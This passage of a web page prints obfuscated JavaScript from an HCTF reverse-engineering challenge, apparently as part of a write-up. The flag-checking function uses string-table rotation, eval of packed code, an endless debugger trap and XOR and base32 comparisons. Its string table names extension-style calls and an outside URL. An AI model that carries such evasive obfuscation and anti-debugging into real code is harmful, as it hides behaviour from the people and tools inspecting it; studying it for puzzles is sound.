class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> _0x180a = [<span class="string">&#x27;random&#x27;</span>, <span class="string">&#x27;charCodeAt&#x27;</span>, <span class="string">&#x27;fromCharCode&#x27;</span>, <span class="string">&#x27;parse&#x27;</span>, <span class="string">&#x27;substr&#x27;</span>, <span class="string">&#x27;\x5cw+&#x27;</span>, <span class="string">&#x27;replace&#x27;</span>, <span class="string">&#x27;(3()&#123;(3\x20a()&#123;7&#123;(3\x20b(2)&#123;9((\x27\x27+(2/2)).5!==1||2%g===0)&#123;(3()&#123;&#125;).8(\x274\x27)()&#125;c&#123;4&#125;b(++2)&#125;)(0)&#125;d(e)&#123;f(a,6)&#125;&#125;)()&#125;)();&#x27;</span>, <span class="string">&#x27;||i|function|debugger|length|5000|try|constructor|if|||else|catch||setTimeout|20&#x27;</span>, <span class="string">&#x27;pop&#x27;</span>, <span class="string">&#x27;length&#x27;</span>, <span class="string">&#x27;join&#x27;</span>, <span class="string">&#x27;getElementById&#x27;</span>, <span class="string">&#x27;message&#x27;</span>, <span class="string">&#x27;log&#x27;</span>, <span class="string">&#x27;Welcome\x20to\x20HCTF:&gt;&#x27;</span>, <span class="string">&#x27;Congratulations!\x20you\x20got\x20it!&#x27;</span>, <span class="string">&#x27;Sorry,\x20you\x20are\x20wrong...&#x27;</span>, <span class="string">&#x27;window.console.clear();window.console.log(\x27Welcome\x20to\x20HCTF\x20:&gt;\x27)&#x27;</span>, <span class="string">&#x27;version&#x27;</span>, <span class="string">&#x27;error&#x27;</span>, <span class="string">&#x27;download&#x27;</span>, <span class="string">&#x27;substring&#x27;</span>, <span class="string">&#x27;push&#x27;</span>, <span class="string">&#x27;Function&#x27;</span>, <span class="string">&#x27;charAt&#x27;</span>, <span class="string">&#x27;idle&#x27;</span>, <span class="string">&#x27;pyW5F1U43VI&#x27;</span>, <span class="string">&#x27;init&#x27;</span>, <span class="string">&#x27;https://the-extension.com&#x27;</span>, <span class="string">&#x27;local&#x27;</span>, <span class="string">&#x27;storage&#x27;</span>, <span class="string">&#x27;eval&#x27;</span>, <span class="string">&#x27;then&#x27;</span>, <span class="string">&#x27;get&#x27;</span>, <span class="string">&#x27;getTime&#x27;</span>, <span class="string">&#x27;setUTCHours&#x27;</span>, <span class="string">&#x27;origin&#x27;</span>, <span class="string">&#x27;set&#x27;</span>, <span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;loading&#x27;</span>, <span class="string">&#x27;status&#x27;</span>, <span class="string">&#x27;removeListener&#x27;</span>, <span class="string">&#x27;onUpdated&#x27;</span>, <span class="string">&#x27;callee&#x27;</span>, <span class="string">&#x27;addListener&#x27;</span>, <span class="string">&#x27;onMessage&#x27;</span>, <span class="string">&#x27;runtime&#x27;</span>, <span class="string">&#x27;executeScript&#x27;</span>, <span class="string">&#x27;data&#x27;</span>, <span class="string">&#x27;test&#x27;</span>, <span class="string">&#x27;http://&#x27;</span>, <span class="string">&#x27;Url\x20error&#x27;</span>, <span class="string">&#x27;query&#x27;</span>, <span class="string">&#x27;filter&#x27;</span>, <span class="string">&#x27;active&#x27;</span>, <span class="string">&#x27;floor&#x27;</span>];</span><br><span class="line">(<span class="keyword">function</span> (<span class="params">_0xd4b7d6, _0xad25ab</span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> _0x5e3956 = <span class="keyword">function</span> (<span class="params">_0x1661d3</span>) &#123;</span><br><span class="line">        <span class="keyword">while</span> (--_0x1661d3) &#123;</span><br><span class="line">            _0xd4b7d6[<span class="string">&#x27;push&#x27;</span>](_0xd4b7d6[<span class="string">&#x27;shift&#x27;</span>]());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="title function_">_0x5e3956</span>(++_0xad25ab);</span><br><span class="line">&#125;(_0x180a, <span class="number">0x1a2</span>));</span><br><span class="line"><span class="keyword">var</span> _0xa180 = <span class="keyword">function</span> (<span class="params">_0x5c351c, _0x2046d8</span>) &#123;</span><br><span class="line">    _0x5c351c = _0x5c351c - <span class="number">0x0</span>;</span><br><span class="line">    <span class="keyword">var</span> _0x26f3b3 = _0x180a[_0x5c351c];</span><br><span class="line">    <span class="keyword">return</span> _0x26f3b3;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">check</span>(<span class="params">_0x5b7c0c</span>) &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">var</span> _0x2e2f8d = [<span class="string">&#x27;code&#x27;</span>, <span class="title function_">_0xa180</span>(<span class="string">&#x27;0x0&#x27;</span>), <span class="title function_">_0xa180</span>(<span class="string">&#x27;0x1&#x27;</span>), <span class="title function_">_0xa180</span>(<span class="string">&#x27;0x2&#x27;</span>), <span class="string">&#x27;invalidMonetizationCode&#x27;</span>, <span class="title function_">_0xa180</span>(<span class="string">&#x27;0x3&#x27;</span>), <span class="title function_">_0xa180</span>(<span class="string">&#x27;0x4&#x27;</span>), <span class="title function_">_0xa180</span>(<span class="string">&#x27;0x5&#x27;</span>), <span class="title function_">_0xa180</span>(<span class="string">&#x27;0x6&#x27;</span>), <span class="title function_">_0xa180</span>(<span class="string">&#x27;0x7&#x27;</span>), <span class="title function_">_0xa180</span>(<span class="string">&#x27;0x8&#x27;</span>), <span class="title function_">_0xa180</span>(<span class="string">&#x27;0x9&#x27;</span>), <span class="title function_">_0xa180</span>(<span class="string">&#x27;0xa&#x27;</span>), <span class="title function_">_0xa180</span>(<span class="string">&#x27;0xb&#x27;</span>), <span class="title function_">_0xa180</span>(<span class="string">&#x27;0xc&#x27;</span>), <span class="title function_">_0xa180</span>(<span class="string">&#x27;0xd&#x27;</span>), <span class="title function_">_0xa180</span>(<span class="string">&#x27;0xe&#x27;</span>), <span class="title function_">_0xa180</span>(<span class="string">&#x27;0xf&#x27;</span>), <span class="title function_">_0xa180</span>(<span class="string">&#x27;0x10&#x27;</span>), <span class="title function_">_0xa180</span>(<span class="string">&#x27;0x11&#x27;</span>), <span class="string">&#x27;url&#x27;</span>, <span class="title function_">_0xa180</span>(<span class="string">&#x27;0x12&#x27;</span>), <span class="title function_">_0xa180</span>(<span class="string">&#x27;0x13&#x27;</span>), <span class="title function_">_0xa180</span>(<span class="string">&#x27;0x14&#x27;</span>), <span class="title function_">_0xa180</span>(<span class="string">&#x27;0x15&#x27;</span>), <span class="title function_">_0xa180</span>(<span class="string">&#x27;0x16&#x27;</span>), <span class="title function_">_0xa180</span>(<span class="string">&#x27;0x17&#x27;</span>), <span class="title function_">_0xa180</span>(<span class="string">&#x27;0x18&#x27;</span>), <span class="string">&#x27;tabs&#x27;</span>, <span class="title function_">_0xa180</span>(<span class="string">&#x27;0x19&#x27;</span>), <span class="title function_">_0xa180</span>(<span class="string">&#x27;0x1a&#x27;</span>), <span class="title function_">_0xa180</span>(<span class="string">&#x27;0x1b&#x27;</span>), <span class="title function_">_0xa180</span>(<span class="string">&#x27;0x1c&#x27;</span>), <span class="title function_">_0xa180</span>(<span class="string">&#x27;0x1d&#x27;</span>), <span class="string">&#x27;replace&#x27;</span>, <span class="title function_">_0xa180</span>(<span class="string">&#x27;0x1e&#x27;</span>), <span class="title function_">_0xa180</span>(<span class="string">&#x27;0x1f&#x27;</span>), <span class="string">&#x27;includes&#x27;</span>, <span class="title function_">_0xa180</span>(<span class="string">&#x27;0x20&#x27;</span>), <span class="string">&#x27;length&#x27;</span>, <span class="title function_">_0xa180</span>(<span class="string">&#x27;0x21&#x27;</span>), <span class="title function_">_0xa180</span>(<span class="string">&#x27;0x22&#x27;</span>), <span class="title function_">_0xa180</span>(<span class="string">&#x27;0x23&#x27;</span>), <span class="title function_">_0xa180</span>(<span class="string">&#x27;0x24&#x27;</span>), <span class="title function_">_0xa180</span>(<span class="string">&#x27;0x25&#x27;</span>), <span class="title function_">_0xa180</span>(<span class="string">&#x27;0x26&#x27;</span>), <span class="title function_">_0xa180</span>(<span class="string">&#x27;0x27&#x27;</span>), <span class="title function_">_0xa180</span>(<span class="string">&#x27;0x28&#x27;</span>), <span class="title function_">_0xa180</span>(<span class="string">&#x27;0x29&#x27;</span>), <span class="string">&#x27;toString&#x27;</span>, <span class="title function_">_0xa180</span>(<span class="string">&#x27;0x2a&#x27;</span>), <span class="string">&#x27;split&#x27;</span>];</span><br><span class="line">        <span class="keyword">var</span> _0x50559f = _0x5b7c0c[_0x2e2f8d[<span class="number">0x5</span>]](<span class="number">0x0</span>, <span class="number">0x4</span>);</span><br><span class="line">        <span class="keyword">var</span> _0x5cea12 = <span class="built_in">parseInt</span>(<span class="title function_">btoa</span>(_0x50559f), <span class="number">0x20</span>);</span><br><span class="line">        <span class="built_in">eval</span>(<span class="keyword">function</span> (<span class="params">_0x200db2, _0x177f13, _0x46da6f, _0x802d91, _0x2d59cf, _0x2829f2</span>) &#123;</span><br><span class="line">            _0x2d59cf = <span class="keyword">function</span> (<span class="params">_0x4be75f</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> _0x4be75f[<span class="string">&#x27;toString&#x27;</span>](_0x177f13);</span><br><span class="line">            &#125;;</span><br><span class="line">            <span class="keyword">if</span> (!<span class="string">&#x27;&#x27;</span> [<span class="string">&#x27;replace&#x27;</span>](<span class="regexp">/^/</span>, <span class="title class_">String</span>)) &#123;</span><br><span class="line">                <span class="keyword">while</span> (_0x46da6f--) _0x2829f2[<span class="title function_">_0x2d59cf</span>(_0x46da6f)] = _0x802d91[_0x46da6f] || <span class="title function_">_0x2d59cf</span>(_0x46da6f);</span><br><span class="line">                _0x802d91 = [</span><br><span class="line">                    <span class="keyword">function</span> (<span class="params">_0x5e8f1a</span>) &#123;</span><br><span class="line">                        <span class="keyword">return</span> _0x2829f2[_0x5e8f1a];</span><br><span class="line">                    &#125;</span><br><span class="line">                ];</span><br><span class="line">                _0x2d59cf = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">                    <span class="keyword">return</span> <span class="title function_">_0xa180</span>(<span class="string">&#x27;0x2b&#x27;</span>);</span><br><span class="line">                &#125;;</span><br><span class="line">                _0x46da6f = <span class="number">0x1</span>;</span><br><span class="line">            &#125;;</span><br><span class="line">            <span class="keyword">while</span> (_0x46da6f--)</span><br><span class="line">                <span class="keyword">if</span> (_0x802d91[_0x46da6f]) _0x200db2 = _0x200db2[<span class="title function_">_0xa180</span>(<span class="string">&#x27;0x2c&#x27;</span>)](<span class="keyword">new</span> <span class="title class_">RegExp</span>(<span class="string">&#x27;\x5cb&#x27;</span> + <span class="title function_">_0x2d59cf</span>(_0x46da6f) + <span class="string">&#x27;\x5cb&#x27;</span>, <span class="string">&#x27;g&#x27;</span>), _0x802d91[_0x46da6f]);</span><br><span class="line">            <span class="keyword">return</span> _0x200db2;</span><br><span class="line">        &#125;(<span class="title function_">_0xa180</span>(<span class="string">&#x27;0x2d&#x27;</span>), <span class="number">0x11</span>, <span class="number">0x11</span>, <span class="title function_">_0xa180</span>(<span class="string">&#x27;0x2e&#x27;</span>)[<span class="string">&#x27;split&#x27;</span>](<span class="string">&#x27;|&#x27;</span>), <span class="number">0x0</span>, &#123;&#125;));</span><br><span class="line">        (<span class="keyword">function</span> (<span class="params">_0x3291b7, _0xced890</span>) &#123;</span><br><span class="line">            <span class="keyword">var</span> _0xaed809 = <span class="keyword">function</span> (<span class="params">_0x3aba26</span>) &#123;</span><br><span class="line">                <span class="keyword">while</span> (--_0x3aba26) &#123;</span><br><span class="line">                    _0x3291b7[<span class="title function_">_0xa180</span>(<span class="string">&#x27;0x4&#x27;</span>)](_0x3291b7[<span class="string">&#x27;shift&#x27;</span>]());</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;;</span><br><span class="line">            <span class="title function_">_0xaed809</span>(++_0xced890);</span><br><span class="line">        &#125;(_0x2e2f8d, _0x5cea12 % <span class="number">0x7b</span>));</span><br><span class="line">        <span class="keyword">var</span> _0x43c8d1 = <span class="keyword">function</span> (<span class="params">_0x3120e0</span>) &#123;</span><br><span class="line">            <span class="keyword">var</span> _0x3120e0 = <span class="built_in">parseInt</span>(_0x3120e0, <span class="number">0x10</span>);</span><br><span class="line">            <span class="keyword">var</span> _0x3a882f = _0x2e2f8d[_0x3120e0];</span><br><span class="line">            <span class="keyword">return</span> _0x3a882f;</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="keyword">var</span> _0x1c3854 = <span class="keyword">function</span> (<span class="params">_0x52ba71</span>) &#123;</span><br><span class="line">            <span class="keyword">var</span> _0x52b956 = <span class="string">&#x27;0x&#x27;</span>;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">var</span> _0x59c050 = <span class="number">0x0</span>; _0x59c050 &lt; _0x52ba71[<span class="title function_">_0x43c8d1</span>(<span class="number">0x8</span>)]; _0x59c050++) &#123;</span><br><span class="line">                _0x52b956 += _0x52ba71[<span class="title function_">_0x43c8d1</span>(<span class="string">&#x27;f&#x27;</span>)](_0x59c050)[<span class="title function_">_0x43c8d1</span>(<span class="number">0xc</span>)](<span class="number">0x10</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> _0x52b956;</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="keyword">var</span> _0x76e1e8 = _0x5b7c0c[<span class="title function_">_0x43c8d1</span>(<span class="number">0xe</span>)](<span class="string">&#x27;_&#x27;</span>);</span><br><span class="line">        <span class="keyword">var</span> _0x34f55b = (<span class="title function_">_0x1c3854</span>(_0x76e1e8[<span class="number">0x0</span>][<span class="title function_">_0x43c8d1</span>(<span class="number">0xd</span>)](-<span class="number">0x2</span>, <span class="number">0x2</span>)) ^ <span class="title function_">_0x1c3854</span>(_0x76e1e8[<span class="number">0x0</span>][<span class="title function_">_0x43c8d1</span>(<span class="number">0xd</span>)](<span class="number">0x4</span>, <span class="number">0x1</span>))) % _0x76e1e8[<span class="number">0x0</span>][<span class="title function_">_0x43c8d1</span>(<span class="number">0x8</span>)] == <span class="number">0x5</span>;</span><br><span class="line">        <span class="keyword">if</span> (!_0x34f55b) &#123;</span><br><span class="line">            <span class="keyword">return</span> ![];</span><br><span class="line">        &#125;</span><br><span class="line">        b2c = <span class="keyword">function</span> (<span class="params">_0x3f9bc5</span>) &#123;</span><br><span class="line">            <span class="keyword">var</span> _0x3c3bd8 = <span class="string">&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZ234567&#x27;</span>;</span><br><span class="line">            <span class="keyword">var</span> _0x4dc510 = [];</span><br><span class="line">            <span class="keyword">var</span> _0x4a199f = <span class="title class_">Math</span>[<span class="title function_">_0xa180</span>(<span class="string">&#x27;0x25&#x27;</span>)](_0x3f9bc5[<span class="title function_">_0x43c8d1</span>(<span class="number">0x8</span>)] / <span class="number">0x5</span>);</span><br><span class="line">            <span class="keyword">var</span> _0x4ee491 = _0x3f9bc5[<span class="title function_">_0x43c8d1</span>(<span class="number">0x8</span>)] % <span class="number">0x5</span>;</span><br><span class="line">            <span class="keyword">if</span> (_0x4ee491 != <span class="number">0x0</span>) &#123;</span><br><span class="line">                <span class="keyword">for</span> (<span class="keyword">var</span> _0x1e1753 = <span class="number">0x0</span>; _0x1e1753 &lt; <span class="number">0x5</span> - _0x4ee491; _0x1e1753++) &#123;</span><br><span class="line">                    _0x3f9bc5 += <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                _0x4a199f += <span class="number">0x1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">for</span> (_0x1e1753 = <span class="number">0x0</span>; _0x1e1753 &lt; _0x4a199f; _0x1e1753++) &#123;</span><br><span class="line">                _0x4dc510[<span class="title function_">_0x43c8d1</span>(<span class="string">&#x27;1b&#x27;</span>)](_0x3c3bd8[<span class="title function_">_0x43c8d1</span>(<span class="string">&#x27;1d&#x27;</span>)](_0x3f9bc5[<span class="title function_">_0x43c8d1</span>(<span class="string">&#x27;f&#x27;</span>)](_0x1e1753 * <span class="number">0x5</span>) &gt;&gt; <span class="number">0x3</span>));</span><br><span class="line">                _0x4dc510[<span class="title function_">_0x43c8d1</span>(<span class="string">&#x27;1b&#x27;</span>)](_0x3c3bd8[<span class="title function_">_0x43c8d1</span>(<span class="string">&#x27;1d&#x27;</span>)]((_0x3f9bc5[<span class="title function_">_0x43c8d1</span>(<span class="string">&#x27;f&#x27;</span>)](_0x1e1753 * <span class="number">0x5</span>) &amp; <span class="number">0x7</span>) &lt;&lt; <span class="number">0x2</span> | _0x3f9bc5[<span class="title function_">_0x43c8d1</span>(<span class="string">&#x27;f&#x27;</span>)](_0x1e1753 * <span class="number">0x5</span> + <span class="number">0x1</span>) &gt;&gt; <span class="number">0x6</span>));</span><br><span class="line">                _0x4dc510[<span class="title function_">_0x43c8d1</span>(<span class="string">&#x27;1b&#x27;</span>)](_0x3c3bd8[<span class="title function_">_0x43c8d1</span>(<span class="string">&#x27;1d&#x27;</span>)]((_0x3f9bc5[<span class="title function_">_0x43c8d1</span>(<span class="string">&#x27;f&#x27;</span>)](_0x1e1753 * <span class="number">0x5</span> + <span class="number">0x1</span>) &amp; <span class="number">0x3f</span>) &gt;&gt; <span class="number">0x1</span>));</span><br><span class="line">                _0x4dc510[<span class="title function_">_0x43c8d1</span>(<span class="string">&#x27;1b&#x27;</span>)](_0x3c3bd8[<span class="title function_">_0x43c8d1</span>(<span class="string">&#x27;1d&#x27;</span>)]((_0x3f9bc5[<span class="title function_">_0x43c8d1</span>(<span class="string">&#x27;f&#x27;</span>)](_0x1e1753 * <span class="number">0x5</span> + <span class="number">0x1</span>) &amp; <span class="number">0x1</span>) &lt;&lt; <span class="number">0x4</span> | _0x3f9bc5[<span class="title function_">_0x43c8d1</span>(<span class="string">&#x27;f&#x27;</span>)](_0x1e1753 * <span class="number">0x5</span> + <span class="number">0x2</span>) &gt;&gt; <span class="number">0x4</span>));</span><br><span class="line">                _0x4dc510[<span class="title function_">_0x43c8d1</span>(<span class="string">&#x27;1b&#x27;</span>)](_0x3c3bd8[<span class="title function_">_0x43c8d1</span>(<span class="string">&#x27;1d&#x27;</span>)]((_0x3f9bc5[<span class="title function_">_0x43c8d1</span>(<span class="string">&#x27;f&#x27;</span>)](_0x1e1753 * <span class="number">0x5</span> + <span class="number">0x2</span>) &amp; <span class="number">0xf</span>) &lt;&lt; <span class="number">0x1</span> | _0x3f9bc5[<span class="title function_">_0x43c8d1</span>(<span class="string">&#x27;f&#x27;</span>)](_0x1e1753 * <span class="number">0x5</span> + <span class="number">0x3</span>) &gt;&gt; <span class="number">0x7</span>));</span><br><span class="line">                _0x4dc510[<span class="title function_">_0x43c8d1</span>(<span class="string">&#x27;1b&#x27;</span>)](_0x3c3bd8[<span class="title function_">_0x43c8d1</span>(<span class="string">&#x27;1d&#x27;</span>)]((_0x3f9bc5[<span class="title function_">_0x43c8d1</span>(<span class="string">&#x27;f&#x27;</span>)](_0x1e1753 * <span class="number">0x5</span> + <span class="number">0x3</span>) &amp; <span class="number">0x7f</span>) &gt;&gt; <span class="number">0x2</span>));</span><br><span class="line">                _0x4dc510[<span class="title function_">_0x43c8d1</span>(<span class="string">&#x27;1b&#x27;</span>)](_0x3c3bd8[<span class="title function_">_0x43c8d1</span>(<span class="string">&#x27;1d&#x27;</span>)]((_0x3f9bc5[<span class="title function_">_0x43c8d1</span>(<span class="string">&#x27;f&#x27;</span>)](_0x1e1753 * <span class="number">0x5</span> + <span class="number">0x3</span>) &amp; <span class="number">0x3</span>) &lt;&lt; <span class="number">0x3</span> | _0x3f9bc5[<span class="title function_">_0x43c8d1</span>(<span class="string">&#x27;f&#x27;</span>)](_0x1e1753 * <span class="number">0x5</span> + <span class="number">0x4</span>) &gt;&gt; <span class="number">0x5</span>));</span><br><span class="line">                _0x4dc510[<span class="title function_">_0x43c8d1</span>(<span class="string">&#x27;1b&#x27;</span>)](_0x3c3bd8[<span class="title function_">_0x43c8d1</span>(<span class="string">&#x27;1d&#x27;</span>)](_0x3f9bc5[<span class="title function_">_0x43c8d1</span>(<span class="string">&#x27;f&#x27;</span>)](_0x1e1753 * <span class="number">0x5</span> + <span class="number">0x4</span>) &amp; <span class="number">0x1f</span>));</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">var</span> _0x545c12 = <span class="number">0x0</span>;</span><br><span class="line">            <span class="keyword">if</span> (_0x4ee491 == <span class="number">0x1</span>) _0x545c12 = <span class="number">0x6</span>;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span> (_0x4ee491 == <span class="number">0x2</span>) _0x545c12 = <span class="number">0x4</span>;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span> (_0x4ee491 == <span class="number">0x3</span>) _0x545c12 = <span class="number">0x3</span>;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span> (_0x4ee491 == <span class="number">0x4</span>) _0x545c12 = <span class="number">0x1</span>;</span><br><span class="line">            <span class="keyword">for</span> (_0x1e1753 = <span class="number">0x0</span>; _0x1e1753 &lt; _0x545c12; _0x1e1753++) _0x4dc510[<span class="title function_">_0xa180</span>(<span class="string">&#x27;0x2f&#x27;</span>)]();</span><br><span class="line">            <span class="keyword">for</span> (_0x1e1753 = <span class="number">0x0</span>; _0x1e1753 &lt; _0x545c12; _0x1e1753++) _0x4dc510[<span class="title function_">_0x43c8d1</span>(<span class="string">&#x27;1b&#x27;</span>)](<span class="string">&#x27;=&#x27;</span>);</span><br><span class="line">            (<span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">                (<span class="keyword">function</span> <span class="title function_">_0x3c3bd8</span>(<span class="params"></span>) &#123;</span><br><span class="line">                    <span class="keyword">try</span> &#123;</span><br><span class="line">                        (<span class="keyword">function</span> <span class="title function_">_0x4dc510</span>(<span class="params">_0x460a91</span>) &#123;</span><br><span class="line">                            <span class="keyword">if</span> ((<span class="string">&#x27;&#x27;</span> + _0x460a91 / _0x460a91)[<span class="title function_">_0xa180</span>(<span class="string">&#x27;0x30&#x27;</span>)] !== <span class="number">0x1</span> || _0x460a91 % <span class="number">0x14</span> === <span class="number">0x0</span>) &#123;</span><br><span class="line">                                (<span class="keyword">function</span> (<span class="params"></span>) &#123;&#125;[<span class="string">&#x27;constructor&#x27;</span>](<span class="string">&#x27;debugger&#x27;</span>)());</span><br><span class="line">                            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                                <span class="keyword">debugger</span>;</span><br><span class="line">                            &#125;</span><br><span class="line">                            <span class="title function_">_0x4dc510</span>(++_0x460a91);</span><br><span class="line">                        &#125;(<span class="number">0x0</span>));</span><br><span class="line">                    &#125; <span class="keyword">catch</span> (_0x30f185) &#123;</span><br><span class="line">                        <span class="built_in">setTimeout</span>(_0x3c3bd8, <span class="number">0x1388</span>);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;());</span><br><span class="line">            &#125;());</span><br><span class="line">            <span class="keyword">return</span> _0x4dc510[<span class="title function_">_0xa180</span>(<span class="string">&#x27;0x31&#x27;</span>)](<span class="string">&#x27;&#x27;</span>);</span><br><span class="line">        &#125;;</span><br><span class="line">        e = <span class="title function_">_0x1c3854</span>(<span class="title function_">b2c</span>(_0x76e1e8[<span class="number">0x2</span>])[<span class="title function_">_0x43c8d1</span>(<span class="number">0xe</span>)](<span class="string">&#x27;=&#x27;</span>)[<span class="number">0x0</span>]) ^ <span class="number">0x53a3f32</span>;</span><br><span class="line">        <span class="keyword">if</span> (e != <span class="number">0x4b7c0a73</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> ![];</span><br><span class="line">        &#125;</span><br><span class="line">        f = <span class="title function_">_0x1c3854</span>(<span class="title function_">b2c</span>(_0x76e1e8[<span class="number">0x3</span>])[<span class="title function_">_0x43c8d1</span>(<span class="number">0xe</span>)](<span class="string">&#x27;=&#x27;</span>)[<span class="number">0x0</span>]) ^ e;</span><br><span class="line">        <span class="keyword">if</span> (f != <span class="number">0x4315332</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> ![];</span><br><span class="line">        &#125;</span><br><span class="line">        n = f * e * _0x76e1e8[<span class="number">0x0</span>][<span class="title function_">_0x43c8d1</span>(<span class="number">0x8</span>)];</span><br><span class="line">        h = <span class="keyword">function</span> (<span class="params">_0x4c466e, _0x28871</span>) &#123;</span><br><span class="line">            <span class="keyword">var</span> _0x3ea581 = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">var</span> _0x2fbf7a = <span class="number">0x0</span>; _0x2fbf7a &lt; _0x4c466e[<span class="title function_">_0x43c8d1</span>(<span class="number">0x8</span>)]; _0x2fbf7a++) &#123;</span><br><span class="line">                _0x3ea581 += <span class="title function_">_0x28871</span>(_0x4c466e[_0x2fbf7a]);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> _0x3ea581;</span><br><span class="line">        &#125;;</span><br><span class="line">        j = _0x76e1e8[<span class="number">0x1</span>][<span class="title function_">_0x43c8d1</span>(<span class="number">0xe</span>)](<span class="string">&#x27;3&#x27;</span>);</span><br><span class="line">        <span class="keyword">if</span> (j[<span class="number">0x0</span>][<span class="title function_">_0x43c8d1</span>(<span class="number">0x8</span>)] != j[<span class="number">0x1</span>][<span class="title function_">_0x43c8d1</span>(<span class="number">0x8</span>)] || (<span class="title function_">_0x1c3854</span>(j[<span class="number">0x0</span>]) ^ <span class="title function_">_0x1c3854</span>(j[<span class="number">0x1</span>])) != <span class="number">0x1613</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> ![];</span><br><span class="line">        &#125;</span><br><span class="line">        k = <span class="function"><span class="params">_0xffcc52</span> =&gt;</span> _0xffcc52[<span class="title function_">_0x43c8d1</span>(<span class="string">&#x27;f&#x27;</span>)]() * _0x76e1e8[<span class="number">0x1</span>][<span class="title function_">_0x43c8d1</span>(<span class="number">0x8</span>)];</span><br><span class="line">        l = <span class="title function_">h</span>(j[<span class="number">0x0</span>], k);</span><br><span class="line">        <span class="keyword">if</span> (l != <span class="number">0x2f9b5072</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> ![];</span><br><span class="line">        &#125;</span><br><span class="line">        m = <span class="title function_">_0x1c3854</span>(_0x76e1e8[<span class="number">0x4</span>][<span class="title function_">_0x43c8d1</span>(<span class="number">0xd</span>)](<span class="number">0x0</span>, <span class="number">0x4</span>)) - <span class="number">0x48a05362</span> == n % l;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">function</span> <span class="title function_">_0x5a6d56</span>(<span class="params">_0x5a25ab, _0x4a4483</span>) &#123;</span><br><span class="line">            <span class="keyword">var</span> 